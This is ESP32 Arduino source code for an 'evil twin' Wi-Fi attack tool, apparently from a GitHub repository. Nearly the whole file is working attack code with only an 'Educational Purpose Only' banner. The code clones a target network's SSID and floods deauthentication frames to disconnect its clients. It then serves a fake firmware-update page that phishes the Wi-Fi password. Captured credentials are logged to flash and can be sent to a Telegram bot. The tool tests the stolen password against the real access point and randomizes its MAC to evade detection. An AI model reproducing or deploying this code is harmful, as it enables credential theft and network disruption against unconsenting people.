https://github.com/tahergaming13/evil-twin-atack-.git#include <Arduino.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <SPIFFS.h>
#include <esp_wifi.h>
#include <WiFiClientSecure.h>

// ==================== CONFIGURATION ====================
// Telegram settings
const String TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
const String TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE";
const bool ENABLE_TELEGRAM = false;

// Deauth settings
bool deauthActive = false;
unsigned long lastDeauthTime = 0;
const unsigned long DEAUTH_INTERVAL = 100;

// MAC randomization
bool macRandomized = false;

// Client fingerprinting
struct ConnectedClient {
  uint8_t mac[6];
  String ip;
  String vendor;
  unsigned long lastSeen;
};
std::vector<ConnectedClient> connectedClients;
unsigned long lastClientUpdate = 0;
const unsigned long CLIENT_UPDATE_INTERVAL = 5000;

// ==================== END CONFIGURATION ====================

typedef struct {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
  String bssidStr;
  int rssi;
  bool isHidden;
} NetworkInfo;

struct EvilTwinConfig {
  String title = "Firmware Update Required";
  String subtitle = "SYSTEM MAINTENANCE MODE";
  String body = "Your device requires a critical firmware update.<br><br>Please enter your WiFi password.";
  String selectedCustomPage = "";
  bool useCustomHTML = false;
};

const byte DNS_PORT = 53;
const char* CRED_FILE = "/creds.txt";

IPAddress apIP(192, 168, 4, 1);
DNSServer dnsServer;
WebServer webServer(80);

std::vector<NetworkInfo> networks;
NetworkInfo selectedNetwork;
EvilTwinConfig evilTwinConfig;

String currentEvilTwinSSID = "";
unsigned long lastScan = 0;
const unsigned long SCAN_INTERVAL = 30000;
bool hotspotActive = false;
bool scanInProgress = false;

// ------------------ UTILS ------------------
String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += "0";
    str += String(b[i], HEX);
    if (i < size - 1) str += ":";
  }
  return str;
}

String getCurrentTime() {
  unsigned long t = millis() / 1000;
  char buf[20];
  sprintf(buf, "%02lu:%02lu:%02lu", (t / 3600) % 24, (t / 60) % 60, t % 60);
  return String(buf);
}

// ------------------ CREDENTIAL STORAGE ------------------
void logCredentialsToSPIFFS(String ssid, String capturedData, String ip) {
  File f = SPIFFS.open(CRED_FILE, "a");
  if (f) {
    f.println(getCurrentTime() + " | SSID: " + ssid + " | " + capturedData + " | IP: " + ip);
    f.close();
    Serial.println("[+] Credential saved to SPIFFS");
  }
}

String readCredentialsFromSPIFFS() {
  if (!SPIFFS.exists(CRED_FILE)) return "No credentials captured yet.\n";
  File f = SPIFFS.open(CRED_FILE, "r");
  String content = "";
  int count = 1;
  while (f.available()) {
    String line = f.readStringUntil('\n');
    if (line.length() > 0) {
      content += String(count++) + ". " + line + "\n";
    }
  }
  f.close();
  return content;
}

void clearCredentials() {
  SPIFFS.remove(CRED_FILE);
  Serial.println("[+] Credentials cleared");
}

// ------------------ FILE SYSTEM ------------------
String loadHTMLContent(const String& filename) {
  String filepath = filename.startsWith("/") ? filename : "/" + filename;
  if (SPIFFS.exists(filepath)) {
    File file = SPIFFS.open(filepath, "r");
    if (file) {
      String c = file.readString();
      file.close();
      return c;
    }
  }
  return "";
}

// ------------------ TELEGRAM ------------------
String urlEncode(String str) {
  String encoded = "";
  char c;
  for (int i = 0; i < str.length(); i++) {
    c = str.charAt(i);
    if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
      encoded += c;
    } else if (c == ' ') {
      encoded += "+";
    } else {
      encoded += '%';
      encoded += String(c, HEX);
    }
  }
  return encoded;
}

void sendToTelegram(String message) {
  if (!ENABLE_TELEGRAM) return;
  WiFiClientSecure client;
  client.setInsecure();
  String url = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendMessage";
  String payload = "chat_id=" + TELEGRAM_CHAT_ID + "&text=" + urlEncode(message);
  
  if (client.connect("api.telegram.org", 443)) {
    client.println("POST " + url + " HTTP/1.1");
    client.println("Host: api.telegram.org");
    client.println("Content-Type: application/x-www-form-urlencoded");
    client.println("Content-Length: " + String(payload.length()));
    client.println();
    client.println(payload);
    delay(200);
    while (client.available()) client.read();
  } else {
    Serial.println("[!] Failed to connect to Telegram API");
  }
  client.stop();
}

// ------------------ DEAUTHENTICATION ------------------
void sendDeauthPacket(uint8_t* targetMAC, uint8_t* apBSSID, uint8_t channel) {
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  uint8_t deauthPacket[26] = {
    0xC0, 0x00,
    0x00, 0x00,
    targetMAC[0], targetMAC[1], targetMAC[2], targetMAC[3], targetMAC[4], targetMAC[5],
    apBSSID[0], apBSSID[1], apBSSID[2], apBSSID[3], apBSSID[4], apBSSID[5],
    apBSSID[0], apBSSID[1], apBSSID[2], apBSSID[3], apBSSID[4], apBSSID[5],
    0x00, 0x07
  };
  esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
}

void startDeauth() {
  if (!hotspotActive) {
    Serial.println("[!] Evil Twin not active. Start it first.");
    return;
  }
  deauthActive = true;
  Serial.println("[+] Deauth loop started.");
}

void stopDeauth() {
  deauthActive = false;
  Serial.println("[-] Deauth loop stopped.");
}

// ------------------ MAC RANDOMIZATION ------------------
void randomizeMAC() {
  uint8_t newMAC[6];
  esp_err_t err = esp_wifi_get_mac(WIFI_IF_AP, newMAC);
  if (err != ESP_OK) {
    Serial.println("[!] Failed to read current MAC");
    return;
  }
  newMAC[3] = random(0x00, 0xFF);
  newMAC[4] = random(0x00, 0xFF);
  newMAC[5] = random(0x00, 0xFF);
  newMAC[0] &= 0xFE;
  err = esp_wifi_set_mac(WIFI_IF_AP, newMAC);
  if (err == ESP_OK) {
    Serial.println("[+] MAC address randomized: " + bytesToStr(newMAC, 6));
    macRandomized = true;
  } else {
    Serial.println("[!] MAC randomization failed");
  }
}

// ------------------ CLIENT FINGERPRINTING ------------------
String getVendor(uint8_t* mac) {
  uint32_t oui = (mac[0] << 16) | (mac[1] << 8) | mac[2];
  switch (oui) {
    case 0xACBC32: return "Apple Inc.";
    case 0x502B73: return "Samsung";
    case 0x3C15C2: return "Google";
    case 0x001C42: return "Intel";
    case 0x74F06D: return "Huawei";
    case 0x98F4AB: return "Xiaomi";
    case 0xDCA4CA: return "Amazon";
    case 0xB827EB: return "Raspberry Pi";
    default: return "Unknown";
  }
}

void updateClientList() {
  wifi_sta_list_t stationList;
  esp_wifi_ap_get_sta_list(&stationList);
  connectedClients.clear();
  for (int i = 0; i < stationList.num; i++) {
    ConnectedClient c;
    memcpy(c.mac, stationList.sta[i].mac, 6);
    c.vendor = getVendor(c.mac);
    c.ip = "192.168.4." + String(i+2);
    c.lastSeen = millis();
    connectedClients.push_back(c);
  }
}

void listClients() {
  if (connectedClients.empty()) {
    Serial.println("No clients connected.");
    return;
  }
  Serial.println("\n--- Connected Clients ---");
  for (auto& c : connectedClients) {
    Serial.printf("MAC: %s | Vendor: %s | IP: %s\n",
                  bytesToStr(c.mac, 6).c_str(), c.vendor.c_str(), c.ip.c_str());
  }
  Serial.println("-------------------------\n");
}

// ------------------ PASSWORD VERIFICATION ------------------
bool testPasswordOnRealAP(String password) {
  if (selectedNetwork.ssid.isEmpty()) {
    Serial.println("[!] No target selected. Cannot verify password.");
    return false;
  }
  Serial.printf("[*] Testing password on real AP '%s'...\n", selectedNetwork.ssid.c_str());
  
  // Disconnect from any existing station connection
  WiFi.disconnect(true);
  delay(100);
  
  // Try to connect to the real AP using the BSSID to avoid our own clone
  WiFi.begin(selectedNetwork.ssid.c_str(), password.c_str(), selectedNetwork.ch, selectedNetwork.bssid);
  
  unsigned long start = millis();
  while (WiFi.status() != WL_CONNECTED && (millis() - start) < 8000) { // 8 second timeout
    delay(100);
  }
  
  bool success = (WiFi.status() == WL_CONNECTED);
  if (success) {
    Serial.println("[+] Password is CORRECT! Connected to real AP.");
    WiFi.disconnect(true); // Immediately disconnect
    delay(100);
  } else {
    Serial.println("[-] Password is INCORRECT.");
  }
  return success;
}

// ------------------ EVIL TWIN CORE ------------------
String generateEvilTwinPage() {
  if (evilTwinConfig.useCustomHTML && !evilTwinConfig.selectedCustomPage.isEmpty()) {
    String custom = loadHTMLContent(evilTwinConfig.selectedCustomPage);
    if (!custom.isEmpty()) return custom;
  }
  
  String html = R"raw(<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>)raw";
  html += evilTwinConfig.title;
  html += R"raw(</title><style>body{font-family:sans-serif;background:#f0f2f5;padding:20px;text-align:center}.box{max-width:400px;margin:50px auto;background:white;padding:30px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1)}input{width:100%;padding:12px;margin:10px 0;border:1px solid #ccc;border-radius:4px}button{width:100%;padding:12px;background:#007bff;color:white;border:none;border-radius:4px;cursor:pointer}</style></head><body><div class="box"><h2>)raw";
  html += evilTwinConfig.subtitle;
  html += R"raw(</h2><p>)raw";
  html += evilTwinConfig.body;
  html += R"raw(</p><form action="/" method="post"><input type="password" name="password" placeholder="WiFi Password" required><button type="submit">Connect</button></form></div></body></html>)raw";
  
  return html;
}

void performScan() {
  if (scanInProgress) {
    Serial.println("[!] Scan already in progress");
    return;
  }
  scanInProgress = true;
  Serial.println("\n[*] Scanning for networks...");
  int n = WiFi.scanNetworks(false, true);
  networks.clear();
  
  if (n == 0) {
    Serial.println("[!] No networks found");
    scanInProgress = false;
    return;
  }
  
  for (int i = 0; i < n && i < 30; ++i) {
    NetworkInfo net;
    net.ssid = WiFi.SSID(i);
    net.isHidden = (net.ssid.length() == 0);
    if (net.isHidden) net.ssid = "[Hidden]";
    memcpy(net.bssid, WiFi.BSSID(i), 6);
    net.ch = WiFi.channel(i);
    net.rssi = WiFi.RSSI(i);
    net.bssidStr = bytesToStr(net.bssid, 6);
    networks.push_back(net);
  }
  
  WiFi.scanDelete();
  Serial.printf("[+] Found %d networks\n", networks.size());
  scanInProgress = false;
}

void listNetworks() {
  if (networks.empty()) {
    Serial.println("[!] No networks. Run 'scan' first");
    return;
  }
  
  Serial.println("\n--- Available Networks ---");
  Serial.println("ID | SSID                    | CH | RSSI  | BSSID");
  Serial.println("---|-------------------------|----|-------|------------------");
  for (size_t i = 0; i < networks.size(); i++) {
    Serial.printf("%2d | %-23s | %2d | %4d | %s\n",
                  i, networks[i].ssid.substring(0, 23).c_str(),
                  networks[i].ch, networks[i].rssi, networks[i].bssidStr.c_str());
  }
  Serial.println("----------------------------");
}

void startEvilTwin() {
  if (selectedNetwork.ssid.isEmpty()) {
    Serial.println("[!] No target selected. Use 'select [ID]' first");
    return;
  }
  
  Serial.printf("[*] Starting Evil Twin on '%s' (Channel %d)...\n", 
                selectedNetwork.ssid.c_str(), selectedNetwork.ch);
  
  WiFi.softAPdisconnect(true);
  delay(500);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  
  if (WiFi.softAP(selectedNetwork.ssid.c_str(), NULL, selectedNetwork.ch)) {
    hotspotActive = true;
    currentEvilTwinSSID = selectedNetwork.ssid;
    dnsServer.stop();
    dnsServer.start(DNS_PORT, "*", apIP);
    Serial.println("[+] EVIL TWIN ACTIVE!");
    Serial.printf("    Cloned SSID: %s\n", selectedNetwork.ssid.c_str());
    Serial.printf("    Channel: %d\n", selectedNetwork.ch);
    Serial.printf("    AP IP: %s\n", apIP.toString().c_str());
    Serial.println("[+] Waiting for victims...");
  } else {
    Serial.println("[!] Failed to start Evil Twin");
    WiFi.softAP("WiFi_Pentest", "password123");
  }
}

void stopEvilTwin() {
  if (!hotspotActive) {
    Serial.println("[!] Evil Twin not active");
    return;
  }
  
  Serial.println("[*] Stopping Evil Twin...");
  hotspotActive = false;
  deauthActive = false;
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  delay(500);
  WiFi.softAP("WiFi_Pentest", "password123");
  dnsServer.start(DNS_PORT, "*", apIP);
  Serial.println("[-] Evil Twin stopped");
}

void showStatus() {
  Serial.println("\n--- System Status ---");
  Serial.printf("Evil Twin Active: %s\n", hotspotActive ? "YES" : "NO");
  if (hotspotActive) {
    Serial.printf("Target SSID: %s\n", currentEvilTwinSSID.c_str());
    Serial.printf("Channel: %d\n", selectedNetwork.ch);
  }
  Serial.printf("Selected Target: %s\n", selectedNetwork.ssid.isEmpty() ? "None" : selectedNetwork.ssid.c_str());
  Serial.printf("Networks in cache: %d\n", networks.size());
  Serial.printf("AP IP: %s\n", WiFi.softAPIP().toString().c_str());
  Serial.printf("AP MAC: %s\n", WiFi.softAPmacAddress().c_str());
  Serial.printf("Connected Clients: %d\n", WiFi.softAPgetStationNum());
  Serial.printf("Deauth Active: %s\n", deauthActive ? "YES" : "NO");
  Serial.printf("MAC Randomized: %s\n", macRandomized ? "YES" : "NO");
  Serial.println("--------------------");
}

void showConfig() {
  Serial.println("\n--- Evil Twin Configuration ---");
  Serial.printf("Title: %s\n", evilTwinConfig.title.c_str());
  Serial.printf("Subtitle: %s\n", evilTwinConfig.subtitle.c_str());
  Serial.printf("Body: %s\n", evilTwinConfig.body.c_str());
  Serial.printf("Custom HTML: %s\n", evilTwinConfig.useCustomHTML ? "Enabled" : "Disabled");
  if (evilTwinConfig.useCustomHTML) {
    Serial.printf("Custom Page: %s\n", evilTwinConfig.selectedCustomPage.c_str());
  }
  Serial.println("-------------------------------");
}

void updateConfig(String title, String subtitle, String body) {
  if (title.length() > 0) evilTwinConfig.title = title;
  if (subtitle.length() > 0) evilTwinConfig.subtitle = subtitle;
  if (body.length() > 0) evilTwinConfig.body = body;
  Serial.println("[+] Configuration updated");
  showConfig();
}

// ------------------ CREDENTIAL PROCESSING (UPDATED) ------------------
void processCaptivePortalLogin() {
  String ip = webServer.client().remoteIP().toString();
  String capturedData = "";
  String password = "";
  
  for (int i = 0; i < webServer.args(); i++) {
    String name = webServer.argName(i);
    String value = webServer.arg(i);
    capturedData += name + ": " + value + "  ";
    if (name == "password") password = value;
  }
  
  if (capturedData == "" && webServer.hasArg("plain")) {
    capturedData = "RAW: " + webServer.arg("plain");
    // crude extraction of password field from raw body
    int passPos = webServer.arg("plain").indexOf("password=");
    if (passPos >= 0) {
      int end = webServer.arg("plain").indexOf('&', passPos);
      if (end < 0) end = webServer.arg("plain").length();
      password = webServer.arg("plain").substring(passPos + 9, end);
      password.replace("+", " ");
    }
  }
  
  if (capturedData == "") capturedData = "[Unknown]";
  
  Serial.println("\n🔥🔥🔥 CREDENTIAL CAPTURED! 🔥🔥🔥");
  Serial.printf("Time: %s\n", getCurrentTime().c_str());
  Serial.printf("Target: %s\n", currentEvilTwinSSID.c_str());
  Serial.printf("Victim IP: %s\n", ip.c_str());
  Serial.printf("Data: %s\n", capturedData.c_str());
  Serial.println("----------------------------------------");
  
  logCredentialsToSPIFFS(currentEvilTwinSSID, capturedData, ip);
  
  // Send Telegram notification
  if (ENABLE_TELEGRAM) {
    String msg = "📡 *Evil Twin Capture*\nSSID: " + currentEvilTwinSSID +
                 "\nData: " + capturedData +
                 "\nIP: " + ip;
    sendToTelegram(msg);
  }
  
  // --- PASSWORD VERIFICATION ---
  bool passwordCorrect = false;
  if (password.length() > 0) {
    passwordCorrect = testPasswordOnRealAP(password);
  } else {
    Serial.println("[!] No password field found in captured data.");
  }
  
  if (passwordCorrect) {
    // Correct password: show 404 error and shut down Evil Twin
    Serial.println("[!] Correct password entered! Shutting down Evil Twin.");
    String html = R"(<html><head><title>404 Not Found</title></head>
    <body><h1>404 Not Found</h1><p>The requested URL was not found on this server.</p></body></html>)";
    webServer.send(404, "text/html", html);
    // Stop the Evil Twin after sending response
    stopEvilTwin();
  } else {
    // Wrong password: show error message and keep portal
    String html = R"(<html><head><meta name="viewport" content="width=device-width"><title>Error</title>
    <style>body{font-family:sans-serif;text-align:center;padding:50px}</style></head>
    <body><h2>Incorrect Password</h2><p>The password you entered is incorrect.<br>Please try again.</p>
    <a href="/">Go back</a></body></html>)";
    webServer.send(200, "text/html", html);
    Serial.println("[*] Wrong password. Evil Twin continues.");
  }
}

// ------------------ WEB SERVER HANDLERS ------------------
void handleCaptivePortal() {
  if (!hotspotActive) {
    webServer.sendHeader("Location", "/admin");
    webServer.send(302, "text/plain", "");
    return;
  }
  
  if (webServer.method() == HTTP_POST || webServer.hasArg("password") || 
      webServer.hasArg("user") || webServer.hasArg("email") || webServer.hasArg("username")) {
    processCaptivePortalLogin();
    return;
  }
  
  webServer.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  webServer.send(200, "text/html", generateEvilTwinPage());
}

void handleAdmin() {
  String html = "<!DOCTYPE html><html><head><title>ESP32 Evil Twin</title>"
                "<meta name='viewport' content='width=device-width'>"
                "<style>body{font-family:monospace;padding:20px}</style></head>"
                "<body><h1>ESP32 Evil Twin</h1>"
                "<p>Use Serial Terminal for full control</p>"
                "<p>Connect via USB and open Serial Monitor at 115200 baud</p>"
                "<p>Type 'help' for commands</p>"
                "<hr>"
                "<h3>New Commands:</h3>"
                "<code>deauth start|stop</code> - Start/stop deauth loop<br>"
                "<code>randommac</code> - Randomize AP MAC address<br>"
                "<code>clients</code> - Show connected clients<br>"
                "</body></html>";
  webServer.send(200, "text/html", html);
}

// ------------------ SERIAL COMMAND PROCESSING ------------------
void showHelp() {
  Serial.println("\n=== ESP32 Evil Twin Commands ===");
  Serial.println("help                    - Show this help");
  Serial.println("scan                    - Scan for WiFi networks");
  Serial.println("list                    - List scanned networks");
  Serial.println("select <ID>             - Select target by ID");
  Serial.println("start                   - Start Evil Twin attack");
  Serial.println("stop                    - Stop Evil Twin attack");
  Serial.println("deauth start|stop       - Start/stop deauth loop");
  Serial.println("status                  - Show system status");
  Serial.println("creds                   - Show captured credentials");
  Serial.println("clear                   - Clear all credentials");
  Serial.println("config                  - Show current config");
  Serial.println("setconfig <title>|<sub>|<body> - Update page text (use | as separator)");
  Serial.println("randommac               - Randomize AP MAC address");
  Serial.println("clients                 - Show connected clients");
  Serial.println("reboot                  - Reboot ESP32");
  Serial.println("=================================");
}

void processSerialCommand(String input) {
  input.trim();
  if (input.length() == 0) return;
  
  String cmd = input;
  String param = "";
  
  int spaceIndex = input.indexOf(' ');
  if (spaceIndex > 0) {
    cmd = input.substring(0, spaceIndex);
    param = input.substring(spaceIndex + 1);
    param.trim();
  }
  
  cmd.toLowerCase();
  
  if (cmd == "help") {
    showHelp();
  }
  else if (cmd == "scan") {
    performScan();
  }
  else if (cmd == "list") {
    listNetworks();
  }
  else if (cmd == "select") {
    int id = param.toInt();
    if (id >= 0 && id < (int)networks.size()) {
      selectedNetwork = networks[id];
      Serial.printf("[+] Selected: %s (CH: %d, BSSID: %s)\n", 
                    selectedNetwork.ssid.c_str(), selectedNetwork.ch, selectedNetwork.bssidStr.c_str());
    } else {
      Serial.println("[!] Invalid ID. Use 'list' to see available networks");
    }
  }
  else if (cmd == "start") {
    startEvilTwin();
  }
  else if (cmd == "stop") {
    stopEvilTwin();
  }
  else if (cmd == "deauth") {
    if (param == "start") startDeauth();
    else if (param == "stop") stopDeauth();
    else Serial.println("[!] Usage: deauth start|stop");
  }
  else if (cmd == "status") {
    showStatus();
  }
  else if (cmd == "creds") {
    Serial.println("\n=== Captured Credentials ===");
    Serial.print(readCredentialsFromSPIFFS());
    Serial.println("=============================");
  }
  else if (cmd == "clear") {
    clearCredentials();
  }
  else if (cmd == "config") {
    showConfig();
  }
  else if (cmd == "setconfig") {
    int firstBar = param.indexOf('|');
    int secondBar = param.indexOf('|', firstBar + 1);
    
    if (firstBar > 0 && secondBar > firstBar) {
      String title = param.substring(0, firstBar);
      String subtitle = param.substring(firstBar + 1, secondBar);
      String body = param.substring(secondBar + 1);
      updateConfig(title, subtitle, body);
    } else {
      Serial.println("[!] Format: setconfig Title|Subtitle|Body");
    }
  }
  else if (cmd == "randommac") {
    randomizeMAC();
    if (hotspotActive) stopEvilTwin();
    WiFi.softAPdisconnect(true);
    WiFi.softAP("WiFi_Pentest", "password123");
    if (hotspotActive) startEvilTwin();
  }
  else if (cmd == "clients") {
    updateClientList();
    listClients();
  }
  else if (cmd == "reboot") {
    Serial.println("[*] Rebooting...");
    delay(1000);
    ESP.restart();
  }
  else {
    Serial.printf("[!] Unknown command: %s\n", cmd.c_str());
    Serial.println("Type 'help' for available commands");
  }
}

// ------------------ SETUP ------------------
void setup() {
  Serial.begin(115200);
  delay(1000);
  
  Serial.println("\n========================================");
  Serial.println("   ESP32 Evil Twin - Serial Terminal");
  Serial.println("   Educational Purpose Only");
  Serial.println("========================================");
  
  if (!SPIFFS.begin(true)) {
    Serial.println("[!] SPIFFS mount failed");
  } else {
    Serial.println("[+] SPIFFS mounted");
  }
  
  WiFi.mode(WIFI_AP_STA);
  
  wifi_country_t country = {
    .cc = "CN",
    .schan = 1,
    .nchan = 13,
    .policy = WIFI_COUNTRY_POLICY_AUTO,
  };
  esp_wifi_set_country(&country);
  
  randomizeMAC();
  
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  if (WiFi.softAP("WiFi_Pentest", "password123")) {
    Serial.printf("[+] Admin AP started: WiFi_Pentest (PW: password123)\n");
    Serial.printf("[+] Admin IP: %s\n", apIP.toString().c_str());
  } else {
    Serial.println("[!] Failed to start admin AP");
  }
  
  dnsServer.start(DNS_PORT, "*", apIP);
  
  webServer.on("/", handleCaptivePortal);
  webServer.on("/admin", handleAdmin);
  webServer.on("/login", handleCaptivePortal);
  webServer.onNotFound(handleCaptivePortal);
  webServer.begin();
  Serial.println("[+] Web server started");
  
  performScan();
  
  Serial.println("\n[*] Ready! Type 'help' for commands\n");
}

// ------------------ MAIN LOOP ------------------
void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
  
  if (millis() - lastScan > SCAN_INTERVAL && !hotspotActive && !scanInProgress) {
    performScan();
    lastScan = millis();
  }
  
  if (deauthActive && hotspotActive) {
    if (millis() - lastDeauthTime > DEAUTH_INTERVAL) {
      uint8_t broadcastMAC[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
      sendDeauthPacket(broadcastMAC, selectedNetwork.bssid, selectedNetwork.ch);
      lastDeauthTime = millis();
    }
  }
  
  if (millis() - lastClientUpdate > CLIENT_UPDATE_INTERVAL) {
    updateClientList();
    lastClientUpdate = millis();
  }
  
  if (Serial.available()) {
    String command = Serial.readStringUntil('\n');
    processSerialCommand(command);
  }
}